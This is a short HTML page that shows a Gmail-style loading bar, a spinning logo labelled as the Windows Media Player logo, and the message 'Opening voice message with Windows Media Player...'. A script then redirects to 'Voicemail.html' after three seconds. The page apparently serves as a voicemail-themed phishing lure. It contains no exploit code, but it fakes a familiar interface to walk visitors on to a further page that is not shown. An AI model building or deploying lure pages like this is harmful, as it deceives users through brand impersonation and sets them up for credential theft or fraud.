<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Opening Voice Message</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #ffffff;
      font-family: 'Roboto', sans-serif;
      color: #202124;
      text-align: center;
      padding-top: 100px;
      margin: 0;
    }

    .progress-bar {
      position: fixed;
      top: 0;
      left: 0;
      height: 3px;
      width: 100%;
      background: #cfd8dc;
    }

    .progress-inner {
      width: 0%;
      height: 100%;
      background: #1a73e8;
      animation: progress 3s linear forwards;
    }

    @keyframes progress {
      0% { width: 0%; }
      100% { width: 100%; }
    }

    .container {
      max-width: 400px;
      margin: auto;
      padding: 30px;
    }

    .logo {
      width: 64px;
      margin-bottom: 20px;
    }

    /* 🔄 Rotating animation for your PNG logo */
    .animated-logo {
      animation: rotate 2s linear infinite;
    }

    @keyframes rotate {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .message {
      font-size: 18px;
      margin-bottom: 20px;
    }

    .spinner {
      display: inline-block;
      width: 32px;
      height: 32px;
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-left-color: #1a73e8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>

  <script>
    // Redirect after 3 seconds
    setTimeout(function() {
      window.location.href = "Voicemail.html"; // Or "Voicemail.html"
    }, 3000);
  </script>
</head>
<body>

  <!-- Gmail-style loading bar -->
  <div class="progress-bar">
    <div class="progress-inner"></div>
  </div>

  <div class="container">
    <!-- Rotating media player logo (PNG with CSS animation) -->
    <img src="img/media-player-logo.png" alt="Windows Media Player Logo" class="logo animated-logo">

    <div class="message">
      Opening voice message with Windows Media Player...
    </div>

    <div class="spinner"></div>
  </div>

</body>
</html>
